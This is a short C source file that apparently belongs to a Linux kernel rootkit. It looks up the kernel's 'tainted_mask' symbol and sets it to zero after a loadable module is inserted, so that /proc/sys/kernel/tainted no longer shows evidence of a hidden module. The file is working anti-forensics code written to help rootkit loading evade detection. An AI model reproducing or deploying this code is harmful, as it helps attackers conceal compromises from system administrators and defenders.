/* reset_tainted.c — Clears kernel taint flag after LKM load.
 *
 * Without this, /proc/sys/kernel/tainted stays non-zero after insmod,
 * leaking evidence even if the module is hidden.
 *
 * NOTE: kthread approach was removed — calling kthread_stop() on an already-
 * exited thread (the thread returns immediately after reset_taint_mask()) causes
 * a NULL pointer dereference in kthread_stop(). Run directly in module init.
 */
#include "../include/core.h"
#include "../include/reset_tainted.h"
#include "../ftrace/ftrace_helper.h"

static unsigned long *taint_mask_ptr = NULL;

int reset_tainted_init(void)
{
    taint_mask_ptr = (unsigned long *)resolve_sym("tainted_mask");
    if (!taint_mask_ptr)
        return -EFAULT;

    if (*taint_mask_ptr != 0)
        WRITE_ONCE(*taint_mask_ptr, 0);

    return 0;
}

void reset_tainted_exit(void) { /* nothing to undo — taint stays cleared */ }
